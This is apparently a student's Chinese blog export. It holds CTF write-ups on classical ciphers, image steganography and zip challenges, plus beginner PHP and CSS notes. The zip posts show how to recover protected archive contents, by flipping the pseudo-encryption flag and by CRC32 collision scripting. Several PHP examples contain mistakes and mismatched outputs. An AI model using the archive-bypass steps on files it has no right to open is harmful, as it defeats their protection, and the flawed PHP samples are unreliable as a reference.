g前面对应了几乎就没啥子问题了，但是还有一点比较坑的有的因为权值相等，需要在转换的时候看是否应该换一下位置。例如：{ 和 } 权值相等，在转化时看是否需要进行换位置。 我们再观察我们上面画的图，其中5和d的权值也相同，所以如果提交的答案不对的话，就尝试一下换下位置。这道题是西湖论剑的题，下面有进入决赛大佬的WP。关于西湖题的wp 二：传统知识+古典密码在实验吧上做了一道很有意思的题目。首先就想了解一下传统知识吧在百度上找到六十甲子顺序表，就先对应着把数字写出来。 辛卯28，癸巳30，丙戌23，辛未8，庚辰17，癸酉10，己卯16，癸巳30。“+甲子60”（这里有一个疑问，按图来说甲子不应该是1吗？？？ 为什么会+60。。。其实这里面还是对传统文化的不熟悉，查查百度，如果还晕的话，记住就行了）处理完之后的数88,90,83,68,77,70,76,90转换一下ASCII码看看XZSDMFLZ没思路了。。。看看题目咋提示的古典密码古典密码一般涉及的就是替换或移位就先用栅栏密码试试了一共8位： 可以分为2个字一组，也可以是4个字一组，都试试。先用2个字为一组的，解出来栅栏密码在线解密XMZFSLDZ再用凯撒密码解密凯撒在线解密发现有一串字母好像是有点意义的，拿出来试试。shuangyu改为大写，因为我们输入的就是大写。SHUANGYUCTF{SHUANGYU}提交结果正确，就不用再往下试了。这个题有很多好玩的地方，需要了解传统的甲子表，需要了解栅栏密码，要了解凯撒密码。wiki大佬关于密码学的WP各种加密方式 三、滴答滴答下载起来，打开后是这样的看过柯南的都应该知道这个是摩斯密码，所以拿去解一下密，看看会出现什么？摩斯密码解密后面的一堆C和D，但是前面我看到了MORSE（摩斯）后面的应该有意义，百度翻译看一下吧培根？？？，查一下。了解培根加密之后，我们就知道那一堆C和D有啥用处了首先，我们先把C转化为A，D转化为B。转化完成后，进行解密培根加密解密结果出来了，百度翻译一下。当时在这里卡了，猛的一下不知道啥意思。。。还是太菜。经过学长提醒。。。是栅栏密码，猛的一下明白了，原来ZGIAHYANAUOZNXWI这个就是密文，而且也提示了四道栅栏，所以每组四个字。章鱼小丸子至于提交就有点坑了，不用flag{}格式，直接提交就行。不过这道题确实很有意思，了解了摩斯密码，培根密码，栅栏密码。不过还得练，还是太菜，有的时候就是想不到。。。","categories":[],"tags":[]},{"title":"PHP学习(php概念、基本语法、流程控制)","slug":"PHP学习(php概念、基本语法、流程控制)","date":"2019-04-14T11:54:16.576Z","updated":"2019-06-06T07:25:27.303Z","comments":true,"path":"2019/04/14/PHP学习(php概念、基本语法、流程控制)/","link":"","permalink":"http://bealright.github.io/2019/04/14/PHP学习(php概念、基本语法、流程控制)/","excerpt":"","text":"一、初识PHP脚本1.PHP开始标记 1&lt;?php 2.PHP结束标记1?&gt; 3.页面最终是通过HTML，CSS，JS来进行展示的 **4.PHP代码可以嵌入html代码中，可以嵌入到任意位置，并且可以嵌入多个php代码，必须在php文件中嵌入才生效。** 如果建立的是html文件，中间嵌有php代码，apache默认是不会将文件传送到PHP应用服务器，因为建立的是HTML文件，会直接返回给请求方。 5.文件末尾的？&gt;结束标签可以省略 6.指令分隔符** ； 1.在一些PHP语句的结尾要加上 ；表示一句话的结束。 2.结束标记?&gt;隐含了一个 ； 所以在?&gt;之前的PHP语句可以省略掉 ； 7.注释 多行注释 / 多行注释 / 单行注释 //单行注释 8.空白的处理**空格，tab制表符，换行 这些写在PHP代码里是没有影响的可以利用这些来增加代码的可读性。 二、变量 变量是用于临时存储值的容器 1.变量的声明​ 在其他语言中，在使用变量前，事先声明一下！ 注意：在PHP程序中，使用变量之前是不需要声明的！（可以直接使用） 变量用于存储 数字、文本字符串 或者数组的！ $变量名=数据（值） 2.变量的销毁​ unset($变量名称) 3.变量的命令规则​ 1.变量名称严格区分大小写 $name,$NAME,$Name都是不同的变量 2.字母或者下划线开头 总结：变量名只能包含 字母 数字 下划线并且以字母或者下划线开头！ 注意：最好不要用关键字作为变量名称 4.可变变量例如： 12345&lt;?php $a='b'//定义一个变量a储存值b $$a='c'//$b='c' echo $b;?&gt; 输出结果为：1c 5.变量的引用赋值引用赋值相当于给变量加了一个别名 12345&lt;?php $b=&amp;$a;//相当于给$a起了一个别名 $b=20; echo $a;?&gt; 输出结果：120 三、变量类型 PHP是一种弱语言 概述：变量类型是指保存在该变量中的数据类型 1.变量类型简介​ bool（布尔型） 在变量里存true 或 false 那么这个变量就是布尔类型 以下值被认为是false，其他值都是被认为是true 布尔值 false 0 浮点型0.0 空白字符串和字符串0//指的是直接一对单引号或者双引号，里面没有如何内容 例如： 1var_dump((bool)\"\")或var_dump((bool)'') 没有成员的数组1var_dump((bool)array()); NULL例如：1var_dump((bool)NULL); 输出结果 都为： bool(false) int（整形）在变量里面存整数，那么这个变量就是整形变量. float（浮点型，也称double）在变量里面存小数，那么这个变量就是浮点型数据. string（字符串）需要加单引号或者双引号例如：1234&lt;?php $a='t'; var_dump($a);?&gt; var_dump($变量名)//将变量值和类型一起输出 单引号PHP不会解析单引号之间的变量 双引号其中的变量名会被变量值代替，即PHP会解析双引号之间的变量例如：123456&lt;?php $b=100; $a=\"te&#123;$b&#125;st\"; var_dump($a); echo $a; ?&gt; 输入结果:12string te100stte100xt 定界符&lt;&lt;&lt;名字 名字；定界符可以包含单引号、双引号、也可以解析变量例如：1234567&lt;?php $b=200; $a=&lt;&lt;&lt;abc; wwwww&#123;$b&#125;w abc; var_dump($a) ?&gt; 输出结果：1string wwwww200w array(数组)objec（对象）resource（资源）NULL例如：1234&lt;?php $a=null; var_dump($a); ?&gt; 输出结果:1null 二、变量类型相互转化变量类型强制转化例如： 12345&lt;?php $a='www'; $b=(int)$a; var_dump($b); ?&gt; 输出结果：1int 0 四、常量 常量是用于临时（只有在我们的程序的运行过程中才存在）存储值（数据）的容器 定义和使用define(‘常量名称’，常量值)或者define(“常量名称”，常量值)例如:1234&lt;?php define('WWW',10) echo WWW ?&gt; 输出结果：10 常量的命名： 1.和变量一样 只能包含字母、数字、下划线 并且必须以字母或下划线开头。 2.按照惯例常量的名称总是大写的。 3.自定义常量总是严格区分大小写的！ 常量和变量的区别 1.常量前面没有没有符号$ 2.常量只能用define()函数来定义，不能通过赋值语句来定义 3.常量可以不用理会变量范围的规则而在任何地方定义和使用 4.常量一旦被定义就不能重新定义或者取消定义 5.常量的值只能是bool,int,float,string类型 预定义常量 预定义常量是PHP已经定好了的常量 有的预定义常量是以_开头，这些预定义常量叫做魔术常量 代码所在的位置不同 值也是不同的。 1234例如： _LINE_ _FILE_//这些都是魔术常量预定义常量是不区分大小写的 五、运算符 概述： 运算符是对一个或者多个操作数（变量或者数值）执行某种运算的符号，也称操作符！ 算术运算符1 .+例如： 12345&lt;?php $a=1; $b=2; echo $a+$b; ?&gt; 输出结果：3 -第一个意思：减号第二个意思：取反 1234&lt;?php $a=1; -$a;?&gt; 输出结果：-1取反并不会影响到被取反变量本身的值！ *例如：123456&lt;?php &amp;a=1; &amp;b=2; $c=$a*$b; echo $c;?&gt; 输出结果：2 /例如：12345&lt;?php $a=10; $b=2; echo $a/$b;?&gt; 输出结果：5 5.%取模（取余）例如：12345&lt;?php $a=10; $b=3; echo $a%$b; ?&gt; 输出结果： 1 6.++自增例如:12345&lt;?php $a=1; ++$a; echo $a;?&gt; 输出结果： 2 如果 ++在变量之后例如：1234&lt;?php $a=1; echo $a++; ?&gt; 输出结果: 1 7.-- 自减例如：12345&lt;?php $a=10; $a--; echo $a;?&gt; 输出结果： 9 1234&lt;?php $a=10; echo $a--;?&gt; 输出结果： 10 注意：自增自减是对变量来说的！ 字符串运算符1 . 连接运算符例如： 123456&lt;?php $a='i'; $b='is'; $c='hacker'; echo $a.$b.$c;?&gt; 输出结果： iamhacker 2 = 赋值运算符 注意：赋值运算符整个语句是有值的，所以整个语句就是一个表达式，所以我们也可以怎么写： $a=$b=2;相当于$a=($b=2) 把右边的值赋给左边的变量 二元运算符+=运算符 例如：123456&lt;?php $a=1; $b=2; $a+=$b; echo $a;?&gt; 输出结果： 3 -=运算符123456&lt;?php $a=2; $b=1; $a-=$b; echo $a; ?&gt; 输出结果： 1 除此之外，赋值运算符还有 *= /= %= .= 比较运算符 PHP中规定： 使用echo输出布尔类型值的时候 echo true;它在页面中会输出1 echo false;它会在页面中什么都不输出 需要输出布尔类型值的时候最好使用var_dump()这个函数来输出 对操作数（按照比较运算符的要求，规则）进行比较 如果比较出的结果满足比较运算符的要求那么结果就是true（真，成立），否则就是false(假，不成立) 1.==比较左右两边数的值是否相等例如：12345&lt;?php $a=1; $b=1; var_dump($a==$b);?&gt; 输出结果：1bool(true) 2.===全等（值要相等，类型也要相等）例如：12345&lt;?php $a=11; $b='11'; var_dump($a===$b); ?&gt; 输出结果： bool(false) 3.!= 比较值是否不相等 例如：12345&lt;?php $a=1; $b=11; var_dump($a!=$b);?&gt; 输出结果： bool(true) 4.&lt;&gt; 比较值是否不相等5.!==不全等如果两边的操作数不全等那么就是true, 否则就是false php会自动转化类型例如： 12345&lt;?php $a=11; $b='11'; var_dump($a!=$b);?&gt; 输出结果：1bool(false) 12345&lt;?php $a=11; $b='11'; var_dump($a!==$b); ?&gt; 输出结果:1bool(true) 因为类型不一样 6.&lt; 小于比较两边的操作数例如：12345&lt;?php $a=1; $b=1; var_dump($a&lt;$b); ?&gt; 输出结果：1bool(false) 7.&gt; 大于 8. &lt;= 小于等于 9. &gt;= 大于等于 逻辑运算符 概念： 对表达式进行逻辑运算，运算出的结果是布尔类型的值(true,false) 要求： 参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被PHP自动转化成布尔类型的值，然后参与运算。 1.逻辑与 and 或者 &amp;&amp; 左右两边的表达式的值都为true时，运算结果为true。只要其中有一个false，结果就是false。例如：12345&lt;?php $a=true; $b=true; var_dump( $a &amp;&amp; $b); ?&gt; 输出结果：1bool(true) 短路问题： 语言规定： 只要有逻辑运算符（逻辑与、逻辑或）那么运算结果就是一个true或false例如：123456&lt;?php $a=false; $b=1; $a &amp;&amp; ++$b; echo $b; ?&gt; 输出结果： 1 2.逻辑或 or 或者 || 左右两边的表达式的值有一个为true，运算的结果就是true ,只有当两边的值都是false的时候，结果才会是false。 例如：12345&lt;?php $a=true; $b=false; var_dump($a || $b) ?&gt; 输出结果：1bool(true) 短路问题：123456&lt;?php $a=true; $b=1; &amp;a || $ ++b; echo $b; ?&gt; 输出结果： 1 3.逻辑异或 xor 运算规则：左右两边表达式的值不一样的时候结果就是true，如果一样那么结果就是false例如：12345&lt;?php $a=false; $b=true; var_dump($a xor $b); ?&gt; 输出结果：1bool(true) 4.逻辑非 ！ 运算规则：将原来的表达式的值否定掉，原来是true，那么结果就是false例如：1234&lt;?php $a=false; var_dump(!$a); ?&gt; 输出结果： 1bool(true) 5.其他运算符1.？：三元运算符格式： 表达式1?表达式2:表达式3：如果表达式1的值为true，那么就执行表达式2，否则就执行表达式3例如：1234&lt;?php $a=true ? 10 : 20; echo $a; ?&gt; 输出结果：110 2.@屏蔽表达式可能发送错误；在表达式前面加上@ 6.运算符的优先级优先级的概念： 谁的优先级别高，就先执行谁 结合方向 规定了从那个方向开始算的问题 优先级归纳： 1)[结合方向：无]递增递减 2)[右]逻辑非! 3)[左]乘，除，取余 4)[左]加，减，字符串连接符 5)[无]包含大于号或者小于号的比较运算符 6)[无]不包含大于号或者小于号的比较运算符 7)[左]逻辑与&amp;&amp; 8)[左]逻辑或|| 9)[左]? : 10)[右]赋值运算符 12)[左 ]逻辑异或xor 园括号的作用： 用圆括号可以将表达式里面的某一块看成一个整体例如：1234&lt;?php $a=(1+5)*3 echo $a; ?&gt; 输出结果：118 另外使用括号可以增强代码的可读性 流程控制【1】-if语句：1.顺序执行 自上而下执行即可 对执行过程没有控制2.分支执行分支执行可以根据条件是否满足来选择某些代码，PHP的分支执行主要是通过两种语句（if\\switch）来实现 1.if语句：1)单向条件if（表达式） 语句； 表达式的值为true，那么就执行语句1，否则就不执行！例如：123456&lt;?php $a=400; $b=40; if($a&gt;$b) echo \"1\"; echo \"2\"; ?&gt; 输出结果：112 流程控制【2】-switch语句：1234567891011switch(表达式)&#123; case 值 1://case相当于== 语句块1; break; case 值 2: 语句块2; break; ....... default: 语句块n &#125; 循环语句：1.while语句123while(表达式)&#123; 各种语句.... &#125; 2.do…while语句123do&#123; 各种语句 &#125;while(表达式); 3.for语句123for(表达式a;表达式b;表达式c)&#123; 各种语句 &#125; 特殊的流程控制语句1.break语句 2.continue语句 3.exit()语句 作用：结束当前整个程序的执行！","categories":[],"tags":[]},{"title":"CTF隐写总结","slug":"CTF隐写总结","date":"2019-04-06T07:11:55.470Z","updated":"2019-06-06T07:25:01.689Z","comments":true,"path":"2019/04/06/CTF隐写总结/","link":"","permalink":"http://bealright.github.io/2019/04/06/CTF隐写总结/","excerpt":"","text":"CTF隐写总结一：LSB隐写 LSB概念 LSB，英文 least significant bit，中文义最低有效位。 对于一个给定的数据串,其最低有效位就是拥有最小单位数值的那一位. 关于LSB隐写的详细介绍 LSB详细介绍关于LSB隐写的详细算法 LSB详细算法关于LSB隐写的总结博客 LSB隐写总结隐写技巧：PNG文件中的LSB隐写 打开以后是一张这样的图片题目已经提醒这道题属于LSB隐写，那么就发动查百度、谷歌大法吧。经过查找，会发现需要用这个神器来处理这种题目。但打开这个软件需要有java，所以还得下载，最好也配置一下环境变量。java详细配置配置好之后那，用java打开Stegsolve.jar将图片打开后，通过下方的按钮切换不同的通道。结果你就会发现一个很不一样的东西。红色通道前六张都没有太大的变化，但是问题出现在第七张。可以明显的看到，右上方隐藏了一些东西。然后，通过观察，发现，green通道和blue通道也是如此。那接下来就进行数据提取因为发现三种颜色都是在0通道时发生了不同，所以勾选三个颜色的最低位。结果flag就出来咯！！题是很简单，但关键是要理解为何如此做，做题不难，难在理解为何这样做。大牛的博客——介绍为何勾选最低位的0这道题的解法与上一道也是一样的。 二：双图打开后是两张图片，而且两张图片一样。？？？这时就该敏感了，因为大多两张图片相同的题型都是盲水印，另外一种就是双图，但题目已经提示了是双图，所以就安装双图的做法去解决这道题。（两张图片大小不一样，第二张一定隐藏了一些信息）用Stegsolve打开第一张图再使用Image combiner( 图像结合),与第二张结合，看看会发生什么变化。（我觉得这里就是两张图片进行对比，前面可以看到第二张图片比第一张图片大了30多KB，所以那多出的30多KB的内容会出现在结合后的图片中）结果在变换通道中找到一个二维码，扫吧。。。结果什么也扫不出了。。。将这张图片保存下来，再用Stegsolve打开，变换通道，可以看到三张不同的二维码。下面就是扫码工作了，( 推荐支付宝扫码，微信我半天都没扫出来，还以为错了。。。)扫过之后，有提示，有密文，解密就能得出flag了 三：盲水印 盲水印介绍：盲水印隐蔽性强，给水印数据进行编码过后不易被破解出来，而且不会破坏图片美观，且又能很好的保护图片版权。 详细介绍盲水印的一些博客：介绍盲水印盲水印原理打开之后是两张相同的图片发动查百度、谷歌大法，破解盲水印，需要脚本或工具。 BlindWaterMark脚本但要注意这个是py2的脚本，如果下载的是py3就会出现语法错误。（这里卡了我一晚上） 修改方法是：py3自带了一个脚本2to3.py，可以将python2的程序自动转为python3的形式。但是不熟悉python语法，到后面还是会出现错误。（所以最好先不要用这个脚本去解题，待熟悉python语言后再用，否则就算知道哪里错了，也不会改）大牛的博客介绍如何修改 这里介绍另一个脚本blind-watermark这个脚本可以选择下载py3的脚本，这样就可以减少一些修改麻烦。 操作语法python decode.py –original ori.png –image res.png –result extract.png注意： 两张图片分辨率要相同，否则会报错。 在下载脚本的目录里打开cmd，输入命令。出现一个图片，但是打开却。。。黑黑的。。。啥也看不见。。。既然脚本这条路走不通，那只好偷懒了，下载工具吧。数字盲水印&amp;隐形水印制作工具WaterMarkH V1.2下载地址两张图片相同，一定是图片大的那一张隐藏有信息，所以试试第二张。flag出来了(感悟：有时如果是脚本对图片进行盲水印的话，那只能用脚本才能解开。但如果用工具添加水印的话，也只能用工具解开) 四：画图zip里面放了一张图片打开以后是一个很可爱的女孩子用Winhex打开图片，发现有很大的不同，上面全是乱码，但是到了下面全是数字，估计藏有猫腻。ctrl+A全选，然后再将这一堆数字给复制出来再用Notepad++打开提示的是画图，在坐标系里画图需要坐标，现在给的一堆数字是十六进制的数，在Notepad++中转换一下，看是否能出现坐标。结果确实出现了坐标那下面就实现画图吧，怎么画。。。我还是去找百度、谷歌吧 经过查找需要这个画图工具但是得注意一点的是，坐标必须满足这个工具的格式。必须改为这种格式的坐标改成这样很简单，只需要点击替换，把（ 和）都替换掉，把逗号改为空格就了。然后将改好的文档保存，放入gnuplot的bin目录里，打开bin目录gnuplot.exe，输入命令（我理解的是要执行的文件必须和这应用程序放在同一个目录，否则无法执行，会报错). 输入命令 plot “文件名” 用支付宝一扫就🆗了","categories":[],"tags":[]},{"title":"CTF关于ZIP解题过程","slug":"CTF 关于ZIP解题过程","date":"2019-03-31T10:09:29.742Z","updated":"2019-06-06T07:24:57.437Z","comments":true,"path":"2019/03/31/CTF 关于ZIP解题过程/","link":"","permalink":"http://bealright.github.io/2019/03/31/CTF 关于ZIP解题过程/","excerpt":"","text":"CTF 关于ZIP解题1.伪加密类型打开之后是两张图片，一张未加密，一张已加密。利用WinHex打开然后在谷歌上找到大佬关于zip格式的介绍接下来进行对比，看是否属于伪加密通过对比，发现确实属于伪加密。所以将09改为00即可。 总结：从50 4B 01 02 开始数十位数便能查看是否是伪加密。 2.CRC32碰撞总结![在这里插入图片描述](https://github.com/bealright/bealright.github.io/blob/master/CTF%20zip/6.png?raw=true) 这个题是CRC32碰撞，首先有不会的就百度、谷歌。 通过查找发现需要CRC32碰撞的脚本和安装pathon。 一：安装CRC32 Tools 工具地址 二：安装pathon 因为要翻墙，去官网下载会特别慢，下载这个没有病毒，也可以用。 还有下载好之后，最好找一下这个版本的安装教程。安装3.7.2pathon的教程 配置好之后，打开cmd，进入你安装脚本的目录。打开下载好的压缩包：记录下1.2.3的CRC32值利用碰撞的语法： python crc32.py reverse “你的crc32密文”12345678910111213141516171819202122232425D:\\crc32&gt;python crc32.py reverse \"0X7F616EE3\"4 bytes: &#123;0xfc, 0xf3, 0x48, 0x10&#125;verification checksum: 0x7f616ee3 (OK)alternative: 06iBmA (OK)alternative: 2GAaYT (OK)alternative: 4BH2ir (OK)alternative: 8LCPd9 (OK)alternative: AGtKKP (OK)alternative: Dbvk8f (OK)alternative: ECiJJ3 (OK)alternative: Hp2U49 (OK)alternative: M9CXCK (OK)alternative: TrCiM1 (OK)alternative: WoYVfy (OK)alternative: _eO5jQ (OK)alternative: aHGrpU (OK)alternative: eLZsq6 (OK)alternative: k3y2Hh (OK)alternative: kCECM8 (OK)alternative: l61PcW (OK)alternative: m6paxN (OK)alternative: pymQwW (OK)alternative: xo4nzk (OK)alternative: you_ar (OK)&lt;!--破解1.flag--&gt; 12345678910111213141516171819202122D:\\crc32&gt;python crc32.py reverse \"0x127F1984\"4 bytes: &#123;0x0c, 0xa9, 0xe2, 0xfd&#125;verification checksum: 0x127f1984 (OK)alternative: 1IuEfu (OK)alternative: 7P3JWG (OK)alternative: 8_mKpP (OK)alternative: ATZP_9 (OK)alternative: K_XabT (OK)alternative: MZQ2Rr (OK)alternative: O76Mgs (OK)alternative: SxjLss (OK)alternative: TamrYX (OK)alternative: ZnrBeV (OK)alternative: bFsVOt (OK)alternative: cF2gTm (OK)alternative: e_the_ (OK)alternative: kPkXYQ (OK)alternative: lIlfsz (OK)alternative: n8DEGo (OK)alternative: oTvYX2 (OK)alternative: swYuHv (OK)&lt;!--破解2.flag--&gt; 1234567891011121314151617181920D:\\crc32&gt;python crc32.py reverse \"0x4FA83D8C\"4 bytes: &#123;0x7e, 0xfa, 0xeb, 0x0a&#125;verification checksum: 0x4fa83d8c (OK)alternative: 0KjFzu (OK)alternative: 3ka59e (OK)alternative: AwZr1l (OK)alternative: CK_lhq (OK)alternative: DRXRBZ (OK)alternative: LXN1Nr (OK)alternative: PFpQ6n (OK)alternative: RzuOos (OK)alternative: UcrqEX (OK)alternative: a5Dvga (OK)alternative: bXb8Iy (OK)alternative: cDlUSt (OK)alternative: lK2Ttc (OK)alternative: mKseoz (OK)alternative: nViZD2 (OK)alternative: ruFvTv (OK)&lt;!--破解3.flag--&gt; 接下来，找到有意义或连贯的的英语词语。通过查找发现有几个有意义的词语。12e_the_you_ar 一开始以为答案就应该是：flag{you_are_the_}，但提交还是错误。通过查找，发现漏了一种可能，就是特殊字符。CRC32和MD5加密都是不可逆的，也就是说加密之后是不能反过来看我之前的内容。所以有的大佬就将常见的词（例如 A,B,C。。。）写成了一个脚本,通过一个一个对比来破解出之前的密文。 打开我们下载的CRC32脚本。上面便是大佬脚本中的常见词，接下来我们自己添加一些特殊字符。可以看到我自己添加了；/，！等这些特殊符号。（还有一点不要在最后面加特殊字符，会有问题，最好在0前面加）。 再次破解1.2.3.flag发现3中出现有意义的词语。123456789101112131415161718192021222324252627282930313233D:\\crc32&gt;python crc32.py reverse \"0x4FA83D8C\"4 bytes: &#123;0x7e, 0xfa, 0xeb, 0x0a&#125;verification checksum: 0x4fa83d8c (OK)alternative: ,hEjj1 (OK)alternative: .83Y7h (OK)alternative: 0KjFzu (OK)alternative: 3ka59e (OK)alternative: 3w.i8q (OK)alternative: 6R,IKG (OK)alternative: ;,ZkXE (OK)alternative: ;awV5M (OK)alternative: AwZr1l (OK)alternative: CK_lhq (OK)alternative: DRXRBZ (OK)alternative: H,oAJA (OK)alternative: I,.pQX (OK)alternative: I0a,PL (OK)alternative: LXN1Nr (OK)alternative: PFpQ6n (OK)alternative: QgopD; (OK)alternative: RzuOos (OK)alternative: UcrqEX (OK)alternative: Zl,pbO (OK)alternative: a5Dvga (OK)alternative: bXb8Iy (OK)alternative: best!! (OK)alternative: cDlUSt (OK)alternative: f,CHMJ (OK)alternative: lK2Ttc (OK)alternative: mKseoz (OK)alternative: nViZD2 (OK)alternative: ruFvTv (OK)alternative: z.2t4B (OK)在这里插入代码片 best!!所以把之前的拼凑起来。1flag&#123;you_are_the_best!!&#125; 所以这样便把CRC32碰撞的题给做出了咯。 2：GIF图片修复题目已经提示这是一张GIF猜想一下flag肯定会隐藏在95KB里面（毕竟几个字母都占几KB)点击图片，但无法打开。用winhex打开。题中明明说这是一张GIF，所以应该就是修复GIF图片，查百度、谷歌大法。 地址按照上面的操作，并且将文件头改为GIF图片的格式。因为是个动态图，所以下面就得自己想办法让它显示出来。因为我下载了PS软件，所以用这个看会很方便。欧克，这道题已解开。","categories":[],"tags":[]},{"title":"CSS学习总结","slug":"CSS学习总结","date":"2019-03-31T10:03:03.034Z","updated":"2019-06-06T07:24:48.318Z","comments":true,"path":"2019/03/31/CSS学习总结/","link":"","permalink":"http://bealright.github.io/2019/03/31/CSS学习总结/","excerpt":"","text":"CSS学习总结CSS定义及三种引入方式 CSS是一种层叠样式表直接放在div标签里面 第一种：内敛样式表12345678910&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div style=\"color:red;width:100px;height:100px;\"&gt;文本&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 第二种：内部样式表 在里面引用标签要建立联系 需要一个选择器123&lt;style&gt;选择器&#123;选择器的内容&#125;&lt;/style&gt; 1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;style&gt; div &#123;color: red;width: 100px;height: 100px;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;文本&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 第三种：外部样式表 用一个文件 将这些属性放在文件里面例如：建立一个1.css文件 在新建的文件中放入：12345 div &#123;color: red;width: 100px;height: 100px;&#125; 把这些放入这个文件中在原来的文件里引用标签 href属性填入新建的CSS文件1234567891011&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;link rel=\"stylesheet\" href=\"1.css\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div&gt;文本&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 实现结果： CSS语法外部样式表 选择器 { 属性名称：属性值；}12css注释方法：/*注释*/ 颜色rgb色彩模式：R 红色 由浅到深 0—255G 绿色b 蓝色 例如：12345div &#123; width: 100px; height: 100px； color: rgb(225,0,0)；&#125; 同样也可以用百分比进行替换如：12345div &#123; width: 100px; height: 100px； color: rgb(100%,0%,0%)；&#125; 第二种:用颜色名称除此之外，还可以用十六进制代表颜色例如：1234567891011 &lt;p style=\"background-color:#FFFF00\"&gt;16进制&lt;/p&gt;&lt;p style=\"background-color:rgb(255,255,0)\"&gt;RGB&lt;/p&gt;&lt;p style=\"background-color:yellow\"&gt;颜色名称&lt;/p&gt; 实现结果： CSS基本选择器 选择器的作用：通过选择器 可以找到HTML的元素 并且把选择器后面样式传递给元素。四大类选择器：基本选择器组合选择器属性选择器伪元素选择器 基本选择器一 通配符选择器二 标签选择器 比如div三 id 选择器四 class选择器 一：通配符选择器1234*&#123; border: 1px solid balck;&#125;&lt;!--* 可以选择所有的html标签--&gt; 例如：在CSS.html文件中12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;link rel=\"stylesheet\" href=\"2.css\"&lt;/head&gt;&lt;body&gt; &lt;div&gt;div1 &lt;div&gt;div2&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 在2.CSS文件里123*&#123; border: 1px solid black; &#125; 这是外部样式表实现结果为：二：标签选择器例如：我只选择标签在2.CSS文件中123p&#123; border: 1px solid black; &#125; 实现结果：三：id选择器在CSS.html中123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=\"zh\"&gt;&lt;head&gt;&lt;meta charset=\"UTF-8\"&gt;&lt;title&gt;CSS&lt;/title&gt;&lt;link rel=\"stylesheet\" href=\"2.css\"&lt;/head&gt;&lt;body&gt; &lt;div&gt;div1 &lt;div&gt;div2&lt;/div&gt; &lt;p id=\"wo\"&gt;p1&lt;/p&gt; &lt;!--id后面取一个名称--&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 在2.CSS中123456#wo &#123; font-size: 60px; &#125;&lt;!--#加上名称就会选择对应的标签，一一对应--&gt;注意事项：&lt;!--id名称不要在一个文件里重复出现--&gt; 实现结果：四：class标签1234567在CSS.html中&lt;p class=\"wo\"&gt;p2&lt;/p&gt;在2.CSS中.wo &#123; font-size: 60px; &#125;&lt;!-- .就代表了class--&gt; 实现结果：12345678910&lt;!--class标签不具有唯一性--&gt;在CSS.html中&lt;p class=\"wo wo2\"&gt;p2&lt;/p&gt;在2.CSS中.wo &#123; font-size: 60px; &#125;.wo2 &#123; color: red;&#125; CSS原理 优先原则后解析的内容 会覆盖掉之前解析的内容 1.对于同一个选择器：文件执行的顺序是从上往下执行。例如：1234div&#123; color：red; color: green;&#125; 最终文本的颜色是绿色 2.同一类型的选择器：从上往下例如：1234567891011在创建html文件中&lt;body&gt; &lt;div&gt;div1&lt;/div&gt;&lt;/body&gt;在创建CSS文件中div &#123; background-color: red;&#125;div &#123; background-color: green;&#125; 最终的背景色显示是绿色1234567891011在创建的html文件中&lt;body&gt; &lt;div class=\"bg1 bg2\"&gt;div1&lt;/div&gt;&lt;/body&gt;在创建CSS文件中.bg1&#123; background-color: yellow;&#125;.bg2&#123; background-color: green;&#125; 最终显示的背景色是绿色 3.不同类型的选择器：选择器本身具有优先级如：*&lt;div&lt;class&lt;id规则：先解析 低优先级的再解析高优先级的1234567891011在创建的html文件中&lt;body&gt; &lt;div class=\"bg1\"&gt;div1&lt;/div&gt;&lt;/body&gt;在创建的CSS文件中.bg1&#123; background-color: green;&#125;div&#123; background-color:red;&#125; 最终div1的背景色是绿色4.外部样式 内部样式 合并之后一起解析先外部样式 再内部解析例如：12345678910111213例如在html文件中&lt;style&gt;div &#123; background-color: red;&#125;&lt;/style&gt;在CSS文件中div&#123; background-color:yellow;&#125;div &#123; background-color: green;&#125; 先合并起来在按照同一类型的选择器：从上往下执行。最终显示的背景色是红色 5.加了important 字段的，最后再执行.12345678div&#123; background-color: green! important;&#125;最后再执行。div &#123; background-color: yellow; font-size: 30px;&#125; 继承原则嵌套里面的标签 拥有外部标签的某些样式 跟文字、文本相关的样式是可以被继承123456789101112&lt;body&gt; &lt;div class=\"txt\"&gt;div1 &lt;div&gt;div2 &lt;p&gt;p2&lt;/p&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt;在CSS文件中div.txt &#123; color: red;/* 文字的颜色*/&#125; &lt;!--跟文本 文字相关的内容会继承CSS文件中的颜色--&gt; CSS组合选择器 把基本选择器通过特殊的符号串在一起，形成一定的意义。 分组选择器用逗号将标签隔开1234567891011121314在html中&lt;body&gt; &lt;div&gt;div1&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt;&lt;/body&gt;在CSS中div &#123; background: green;&#125;p &#123; background: green; color: red; font-size: 50px;&#125; 为了节省代码量，可以使用分组选择器，实现相同的效果1234567div,p &#123; background：green; color: red;&#125;p &#123; font-size: 50px;&#125; 嵌套选择器空格隔开例如 : p是嵌套在div里面1234567891011121314151617在html中&lt;body&gt;&lt;div&gt;div1 &lt;p&gt;p2&lt;/p&gt; &lt;ul&gt; &lt;li&gt; &lt;p&gt;p3&lt;/p&gt; &lt;/li&gt;&lt;/div&gt; &lt;p&gt;p1&lt;/p&gt; &lt;/body&gt;在CSS中div p&#123; background: green; color: red; font-size: 50px;&#125; p2 